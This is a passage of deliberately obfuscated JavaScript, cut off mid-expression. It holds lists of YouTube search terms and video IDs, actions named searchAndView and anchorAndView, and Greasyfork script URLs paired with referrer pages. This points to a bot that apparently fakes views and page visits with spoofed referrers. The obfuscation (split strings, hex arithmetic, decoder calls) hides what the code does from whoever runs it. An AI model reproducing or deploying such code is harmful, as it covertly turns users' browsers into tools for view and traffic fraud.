+ 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x269b + -0xa3 * -0xe + 0x1dbb)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x9 * -0x3c7 + 0x5ff * -0x1 + 0x2808)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + S(0x8) + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + S(0xa) + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xc * 0x1 + -0x23db * -0x1 + 0x1 * -0x23e4);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    T(0xb, '%f0o') + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    U(0xd) + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    S(0x3) + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + S(0x4) + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + T(0xc, 'v1cy'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + U(0x10) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + U(0x10) + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
